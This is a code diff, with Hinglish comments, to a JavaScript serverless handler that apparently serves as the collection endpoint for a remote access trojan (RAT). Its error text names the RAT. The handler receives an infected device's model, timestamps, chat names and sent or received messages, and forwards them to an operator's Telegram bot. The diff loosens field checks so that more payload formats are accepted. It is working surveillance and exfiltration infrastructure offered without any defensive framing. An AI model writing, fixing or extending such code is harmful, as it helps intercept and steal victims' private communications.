@@ -16,15 +16,22 @@ export default async function handler(request, response) {
         return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
     }
 
-    const { model, time, type, chat, message } = data;
-
-    if (!model || !time || !type || !chat || !message) {
-        return response.status(400).json({ error: 'RAT is sending incomplete data. Required: model, time, type, chat, message.' });
+    if (Object.keys(data).length === 0) {
+        return response.status(400).json({ error: 'No data received' });
     }
 
     try {
-        const status = type.toLowerCase() === 'sent' ? '📤 SENT' : '📥 RECEIVED';
+        // Data ko yahan extract kiya ja raha hai
+        const model = data.model || data.device || 'Unknown Device';
+        const time = data.time || new Date().toLocaleTimeString();
+        const type = data.type || 'info';
+        const chat = data.chat || data.from || 'N/A';
+        const message = data.message || data.text || '';
 
+        // Status ko yahan set kiya ja raha hai
+        const status = type.toLowerCase().includes('sent') ? '📤 SENT' : '📥 RECEIVED';
+
+        // Message ko tere style mein format kiya ja raha hai
         const formattedMessage = `
 📱 ${model}
 🕚 Time: ${time}
@@ -37,12 +44,14 @@ Message: ${message}
 
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
+        // Ab format kiya hua message bheja ja raha hai
         await fetch(telegramApiUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: formattedMessage
+                text: formattedMessage,
+                // Faltu ka Markdown hata diya hai
             }),
         });
         
